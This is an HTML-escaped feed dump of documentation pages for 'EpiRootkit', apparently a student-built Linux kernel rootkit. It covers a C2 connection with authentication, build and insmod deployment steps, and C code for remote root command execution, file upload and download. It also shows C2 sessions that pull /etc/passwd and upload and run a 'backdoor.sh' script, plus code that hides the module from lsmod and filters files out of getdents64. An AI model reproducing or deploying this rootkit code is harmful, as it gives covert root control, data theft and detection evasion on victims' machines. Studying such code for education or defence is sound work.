 &lt;div class="flex-shrink-1 alert-icon">
 
 &lt;span class="material-icons size-20 me-2">
 check_circle
 &lt;/span>&lt;/div>
 
 &lt;div class="w-100">Perfect balance between realism and convinience.&lt;/div>
 &lt;/div>
&lt;ul>
&lt;li>Widely deployed on servers and desktops&lt;/li>
&lt;li>Official cloud and container images simplify automation&lt;/li>
&lt;li>Already uses interesting kernel version (5.4.x) so no need to compile.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="why-kernel-54x">Why Kernel 5.4.x? &lt;a href="#why-kernel-54x" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
&lt;div class="alert alert-primary d-flex" role="alert">
 &lt;div class="flex-shrink-1 alert-icon">
 
 &lt;span class="material-icons size-20 me-2">
 info
 &lt;/span>&lt;/div>
 
 &lt;div class="w-100">Balances modern hooking APIs with exported symbols and no mandatory module signing.&lt;/div>
 &lt;/div>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/04-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication.&lt;/p>
&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="automatic-connection">Automatic Connection &lt;a href="#automatic-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When the rootkit loads, it automatically:&lt;/p>
&lt;ol>
&lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
&lt;li>&lt;strong>Attempts TCP connection&lt;/strong> to configured C2 server&lt;/li>
&lt;li>&lt;strong>Begins keepalive system&lt;/strong> (60-second ping/pong)&lt;/li>
&lt;li>&lt;strong>Handles reconnection&lt;/strong> with exponential backoff&lt;/li>
&lt;/ol>
&lt;h3 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="60de145" class="language-c ">
 &lt;code>// rootkit/core/config.h
#define C2_SERVER_IP &amp;#34;192.168.64.1&amp;#34;
#define C2_SERVER_PORT 4444
#define KEEPALIVE_INTERVAL_MS 60000
#define RECONNECT_DELAY_MS 5000&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="network-architecture">Network Architecture &lt;a href="#network-architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="three-layer-system">Three-Layer System &lt;a href="#three-layer-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Connection Management&lt;/strong> (&lt;code>connection.c&lt;/code>) - High-level coordination&lt;/li>
&lt;li>&lt;strong>Keepalive System&lt;/strong> (&lt;code>keepalive.c&lt;/code>) - Health monitoring&lt;/li>
&lt;li>&lt;strong>Socket Management&lt;/strong> (&lt;code>socket.c&lt;/code>) - Low-level network operations&lt;/li>
&lt;/ol>
&lt;h3 id="connection-states">Connection States &lt;a href="#connection-states" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;code>0&lt;/code> = DISCONNECTED&lt;/li>
&lt;li>&lt;code>1&lt;/code> = CONNECTED&lt;/li>
&lt;li>&lt;code>2&lt;/code> = CONNECTING&lt;/li>
&lt;/ul>
&lt;h2 id="authentication-system">Authentication System &lt;a href="#authentication-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>auth Client-1 password&lt;/code>&lt;/li>
&lt;li>&lt;strong>Rootkit receives&lt;/strong>: Plain text password&lt;/li>
&lt;li>&lt;strong>Rootkit hashes&lt;/strong>: Using SHA-512 kernel crypto API&lt;/li>
&lt;li>&lt;strong>Compares hash&lt;/strong>: Against stored hash in config&lt;/li>
&lt;li>&lt;strong>Returns result&lt;/strong>: SUCCESS or ERROR&lt;/li>
&lt;/ol>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="063008f" class="language-c ">
 &lt;code>// Default password is &amp;#34;password&amp;#34; (SHA-512 hash stored in config)
#define PASSWORD_HASH &amp;#34;b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86&amp;#34;&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="security-features">Security Features &lt;a href="#security-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Rate limiting&lt;/strong>: 5 attempts per 60 seconds&lt;/li>
&lt;li>&lt;strong>Session timeout&lt;/strong>: 1 hour automatic expiry&lt;/li>
&lt;li>&lt;strong>Secure hashing&lt;/strong>: SHA-512 using kernel crypto API&lt;/li>
&lt;/ul>
&lt;h2 id="live-demo">Live Demo &lt;a href="#live-demo" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="44e0d15" class="language-bash ">
 &lt;code>cd attacking_program &amp;amp;&amp;amp; pnpm start&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="2-load-rootkit">2. Load Rootkit &lt;a href="#2-load-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="69c6f95" class="language-bash ">
 &lt;code>sudo insmod epirootkit.ko&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>C2 server shows:&lt;/strong>&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;h1 id="build--deployment">Build &amp;amp; Deployment &lt;a href="#build--deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.&lt;/p>
&lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
&lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
&lt;li>&lt;strong>Architecture&lt;/strong>: x86_64&lt;/li>
&lt;/ul>
&lt;h3 id="dependencies">Dependencies &lt;a href="#dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="f1f2f46" class="language-bash ">
 &lt;code>sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="build-process">Build Process &lt;a href="#build-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-navigate-to-rootkit-directory">1. Navigate to Rootkit Directory &lt;a href="#1-navigate-to-rootkit-directory" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="4cc85a3" class="language-bash ">
 &lt;code>cd rootkit&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="2-build-the-module">2. Build the Module &lt;a href="#2-build-the-module" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="7e536ba" class="language-bash ">
 &lt;code>make clean &amp;amp;&amp;amp; make&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;p>&lt;strong>Expected output:&lt;/strong>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute shell commands remotely through the rootkit with full output capture.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
&lt;li>&lt;strong>C2 sends command&lt;/strong>: &lt;code>exec Client-1 whoami&lt;/code>&lt;/li>
&lt;li>&lt;strong>Rootkit receives&lt;/strong>: Command string via network&lt;/li>
&lt;li>&lt;strong>Executes command&lt;/strong>: Using &lt;code>call_usermodehelper()&lt;/code> with &lt;code>/bin/sh -c&lt;/code>&lt;/li>
&lt;li>&lt;strong>Captures output&lt;/strong>: Redirects stdout/stderr to temporary file&lt;/li>
&lt;li>&lt;strong>Returns result&lt;/strong>: Exit code and output back to C2&lt;/li>
&lt;/ol>
&lt;h2 id="implementation-details">Implementation Details &lt;a href="#implementation-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="execution-method">Execution Method &lt;a href="#execution-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>API&lt;/strong>: &lt;code>call_usermodehelper()&lt;/code> (kernel 5.4.0 compatible)&lt;/li>
&lt;li>&lt;strong>Shell&lt;/strong>: &lt;code>/bin/sh -c &amp;quot;command&amp;quot;&lt;/code>&lt;/li>
&lt;li>&lt;strong>Privileges&lt;/strong>: Runs with root privileges&lt;/li>
&lt;li>&lt;strong>Output capture&lt;/strong>: Temporary files in &lt;code>/tmp/epirootkit_out_*&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="limits">Limits &lt;a href="#limits" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Command length&lt;/strong>: 1024 bytes (MAX_COMMAND_LENGTH)&lt;/li>
&lt;li>&lt;strong>Output size&lt;/strong>: 64KB (MAX_OUTPUT_SIZE) with dynamic allocation&lt;/li>
&lt;li>&lt;strong>Timeout&lt;/strong>: No timeout (commands run to completion)&lt;/li>
&lt;/ul>
&lt;h2 id="usage-examples">Usage Examples &lt;a href="#usage-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="3cdec3e" class="language-bash ">
 &lt;code># System information
c2-server$ exec Client-1 whoami
# Exit code: 0
# Output:
# root

c2-server$ exec Client-1 uname -a
# Exit code: 0
# Output:
# Linux victim 5.4.0-74-generic #83-Ubuntu SMP Wed Apr 29 23:25:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="technical-implementation">Technical Implementation &lt;a href="#technical-implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="command-processing">Command Processing &lt;a href="#command-processing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="bd8b674" class="language-c ">
 &lt;code>// Simplified version of the actual implementation
static int handle_exec(const char *data)
{
 char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, command_copy, NULL };
 char *envp[] = { 
 &amp;#34;HOME=/&amp;#34;, 
 &amp;#34;PATH=/sbin:/bin:/usr/bin:/usr/local/bin&amp;#34;, 
 &amp;#34;TERM=xterm&amp;#34;,
 NULL 
 };
 
 // Generate unique temporary filename
 snprintf(temp_filename, sizeof(temp_filename), 
 &amp;#34;/tmp/epirootkit_out_%d&amp;#34;, atomic_inc_return(&amp;amp;exec_counter));
 
 // Build command with output redirection
 snprintf(full_command, command_len &amp;#43; temp_len &amp;#43; 32,
 &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
 
 // Execute command
 ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
 // Read output from temporary file
 // ... (file reading logic)
 
 return send_result(formatted_result);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="output-capture">Output Capture &lt;a href="#output-capture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Redirection&lt;/strong>: &lt;code>command &amp;gt; /tmp/epirootkit_out_X 2&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
&lt;li>&lt;strong>File reading&lt;/strong>: &lt;code>kernel_read()&lt;/code> to get output&lt;/li>
&lt;li>&lt;strong>Dynamic allocation&lt;/strong>: &lt;code>vmalloc()&lt;/code> for large outputs&lt;/li>
&lt;li>&lt;strong>Cleanup&lt;/strong>: Automatic temporary file removal&lt;/li>
&lt;/ul>
&lt;h2 id="security-considerations">Security Considerations &lt;a href="#security-considerations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="privileges">Privileges &lt;a href="#privileges" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Root execution&lt;/strong>: All commands run with kernel-level privileges&lt;/li>
&lt;li>&lt;strong>No sandboxing&lt;/strong>: Commands have full system access&lt;/li>
&lt;li>&lt;strong>Logging&lt;/strong>: All commands logged to kernel log via &lt;code>pr_info()&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="limitations">Limitations &lt;a href="#limitations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>No interactive commands&lt;/strong>: Cannot handle commands requiring user input&lt;/li>
&lt;/ul></description></item><item><title>File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Transfer files between the C2 server and victim system using direct content transmission.&lt;/p>
&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-process">Upload Process &lt;a href="#upload-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>C2 reads local file&lt;/strong> and sends content&lt;/li>
&lt;li>&lt;strong>Rootkit receives&lt;/strong> filename and content&lt;/li>
&lt;li>&lt;strong>Creates file&lt;/strong> on victim system using &lt;code>filp_open()&lt;/code>&lt;/li>
&lt;li>&lt;strong>Writes content&lt;/strong> using &lt;code>kernel_write()&lt;/code>&lt;/li>
&lt;/ol>
&lt;h3 id="download-process">Download Process &lt;a href="#download-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>C2 requests file&lt;/strong> by path&lt;/li>
&lt;li>&lt;strong>Rootkit opens file&lt;/strong> using &lt;code>filp_open()&lt;/code>&lt;/li>
&lt;li>&lt;strong>Reads content&lt;/strong> using &lt;code>kernel_read()&lt;/code>&lt;/li>
&lt;li>&lt;strong>Sends content&lt;/strong> back to C2 server&lt;/li>
&lt;/ol>
&lt;h2 id="upload-feature">Upload Feature &lt;a href="#upload-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="basic-usage">Basic Usage &lt;a href="#basic-usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="a949028" class="language-bash ">
 &lt;code># Upload file to specific path
c2-server$ upload Client-1 ./config.txt /etc/myapp/config.txt
# ✓ File uploaded successfully (1024 bytes)

# Upload to current directory (uses basename)
c2-server$ upload Client-1 ./script.sh
# ✓ File uploaded successfully (512 bytes) -&amp;gt; ./script.sh&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="implementation-details">Implementation Details &lt;a href="#implementation-details" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>File creation&lt;/strong>: Uses &lt;code>O_WRONLY | O_CREAT | O_TRUNC&lt;/code> flags&lt;/li>
&lt;li>&lt;strong>Permissions&lt;/strong>: Files created with 0644 permissions&lt;/li>
&lt;li>&lt;strong>Size limits&lt;/strong>: 10MB maximum file size&lt;/li>
&lt;/ul>
&lt;h2 id="download-feature">Download Feature &lt;a href="#download-feature" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="basic-usage-1">Basic Usage &lt;a href="#basic-usage-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="390b28f" class="language-bash ">
 &lt;code># Download to specific local path
c2-server$ download Client-1 /etc/passwd ./victim_passwd
# ✓ File downloaded successfully (2048 bytes)

# Download to current directory (uses basename)
c2-server$ download Client-1 /etc/hostname
# ✓ File downloaded successfully (64 bytes) -&amp;gt; ./hostname&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="real-examples">Real Examples &lt;a href="#real-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system-files">System Files &lt;a href="#system-files" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="72e8c6f" class="language-bash ">
 &lt;code># Download system configuration
c2-server$ download Client-1 /etc/passwd
# ✓ File downloaded successfully (2048 bytes)
# Content: root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# ...

# Download network configuration
c2-server$ download Client-1 /etc/hosts
# ✓ File downloaded successfully (256 bytes)
# Content: 127.0.0.1	localhost
# 127.0.1.1	victim
# ...&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="upload-scripts">Upload Scripts &lt;a href="#upload-scripts" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="170915d" class="language-bash ">
 &lt;code># Upload a shell script
c2-server$ upload Client-1 ./backdoor.sh /tmp/backdoor.sh
# ✓ File uploaded successfully (1024 bytes)

# Make it executable (via exec command)
c2-server$ exec Client-1 chmod &amp;#43;x /tmp/backdoor.sh
# Exit code: 0

# Run the script
c2-server$ exec Client-1 /tmp/backdoor.sh
# Exit code: 0
# Output: Backdoor installed successfully&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="technical-implementation">Technical Implementation &lt;a href="#technical-implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-handler">Upload Handler &lt;a href="#upload-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="66de7a3" class="language-c ">
 &lt;code>static int handle_upload(const char *data)
{
 char *filename, *file_content, *separator;
 struct file *file;
 loff_t pos = 0;
 ssize_t bytes_written;
 
 // Parse filename:content format
 separator = strchr(data, &amp;#39;:&amp;#39;);
 *separator = &amp;#39;\0&amp;#39;;
 filename = data;
 file_content = separator &amp;#43; 1;
 
 // Validate filename
 if (!validate_filename(filename))
 return send_error(&amp;#34;Invalid or unsafe filename&amp;#34;);
 
 // Create and write file
 file = filp_open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 bytes_written = kernel_write(file, file_content, content_length, &amp;amp;pos);
 filp_close(file, NULL);
 
 return send_success(&amp;#34;File uploaded successfully&amp;#34;);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="download-handler">Download Handler &lt;a href="#download-handler" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="5d2c29c" class="language-c ">
 &lt;code>static int handle_download(const char *data)
{
 struct file *file;
 loff_t file_size, pos = 0;
 char *file_content, *result_buffer;
 ssize_t bytes_read;
 
 // Open file
 file = filp_open(data, O_RDONLY, 0);
 if (IS_ERR(file))
 return send_error(&amp;#34;File not found or cannot be opened&amp;#34;);
 
 // Check file size
 file_size = i_size_read(file_inode(file));
 if (file_size &amp;gt; MAX_FILE_SIZE) {
 filp_close(file, NULL);
 return send_error(&amp;#34;File too large to download&amp;#34;);
 }
 
 // Read file content
 file_content = vmalloc(file_size &amp;#43; 1);
 bytes_read = kernel_read(file, file_content, file_size, &amp;amp;pos);
 file_content[bytes_read] = &amp;#39;\0&amp;#39;;
 
 // Format response
 result_buffer = vmalloc(file_size &amp;#43; 32);
 snprintf(result_buffer, file_size &amp;#43; 32, &amp;#34;DOWNLOAD:%s&amp;#34;, file_content);
 
 return send_result(result_buffer);
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="f8baefd" class="language-c ">
 &lt;code>// rootkit/core/config.h
#define MAX_FILE_SIZE (10 * 1024 * 1024) // 10MB
#define MAX_FILENAME_LENGTH 255&lt;/code>
 &lt;/pre>
 &lt;/div></description></item><item><title>Stealth &amp; Hiding</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h1 id="stealth--hiding">Stealth &amp;amp; Hiding &lt;a href="#stealth--hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module and files from system detection using kernel hooking techniques.&lt;/p>
&lt;h2 id="what-we-implemented">What We Implemented &lt;a href="#what-we-implemented" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Hide from &lt;code>lsmod&lt;/code>&lt;/strong>: Remove module from kernel module list&lt;/li>
&lt;li>&lt;strong>Hide from &lt;code>/proc/modules&lt;/code>&lt;/strong>: Module not visible in procfs&lt;/li>
&lt;li>&lt;strong>Dynamic control&lt;/strong>: Toggle visibility via C2 commands&lt;/li>
&lt;/ul>
&lt;h3 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>Hide by prefix&lt;/strong>: Files with specific prefixes are hidden&lt;/li>
&lt;li>&lt;strong>Directory listing&lt;/strong>: Intercept &lt;code>getdents64&lt;/code> syscall&lt;/li>
&lt;li>&lt;strong>Automatic hiding&lt;/strong>: Enabled by default when module loads&lt;/li>
&lt;/ul>
&lt;h2 id="module-hiding-1">Module Hiding &lt;a href="#module-hiding-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Find module&lt;/strong>: Locate rootkit in kernel module list&lt;/li>
&lt;li>&lt;strong>Remove from list&lt;/strong>: Use &lt;code>list_del()&lt;/code> to remove from &lt;code>modules&lt;/code> list&lt;/li>
&lt;li>&lt;strong>Store reference&lt;/strong>: Keep pointer to restore later&lt;/li>
&lt;li>&lt;strong>Toggle visibility&lt;/strong>: Can hide/unhide dynamically&lt;/li>
&lt;/ol>
&lt;h3 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="c21c383" class="language-c ">
 &lt;code>int hide_module(void)
{
 struct module *mod;
 
 mutex_lock(&amp;amp;module_mutex);
 list_for_each_entry(mod, &amp;amp;modules, list) {
 if (mod == THIS_MODULE) {
 stealth_state.prev_module_entry = mod-&amp;gt;list.prev;
 list_del(&amp;amp;mod-&amp;gt;list);
 stealth_state.module_hidden = true;
 break;
 }
 }
 mutex_unlock(&amp;amp;module_mutex);
 return 0;
}&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="usage">Usage &lt;a href="#usage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>


 
 
 

 
 
 
 

 

 &lt;div class="prism-codeblock ">
 &lt;pre id="18156bf" class="language-bash ">
 &lt;code># Hide the module
c2-server$ config Client-1
# Select: Toggle Module Hiding
# ✓ Module hidden

# Verify hiding (from victim system)
victim$ lsmod | grep epirootkit
# (no output - module is hidden)

# Check status
c2-server$ status Client-1
# Module Hidden: YES&lt;/code>
 &lt;/pre>
 &lt;/div>
&lt;h3 id="detection-evasion">Detection Evasion &lt;a href="#detection-evasion" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
&lt;li>&lt;strong>&lt;code>lsmod&lt;/code> command&lt;/strong>: Module not listed&lt;/li>
&lt;li>&lt;strong>&lt;code>/proc/modules&lt;/code>&lt;/strong>: Entry removed from procfs&lt;/li>
&lt;li>&lt;strong>System monitoring&lt;/strong>: Most tools rely on these sources&lt;/li>
&lt;/ul>
&lt;h2 id="file-hiding-1">File Hiding &lt;a href="#file-hiding-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="how-it-works-1">How It Works &lt;a href="#how-it-works-1" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
&lt;li>&lt;strong>Hook &lt;code>getdents64&lt;/code>&lt;/strong>: Use kretprobe to intercept directory listings&lt;/li>
&lt;li>&lt;strong>Filter entries&lt;/strong>: Remove files with configured prefixes&lt;/li>
&lt;li>&lt;strong>Modify buffer&lt;/strong>: Adjust directory entry buffer&lt;/li>
&lt;li>&lt;strong>Return filtered&lt;/strong>: Send modified listing to userspace&lt;/li>
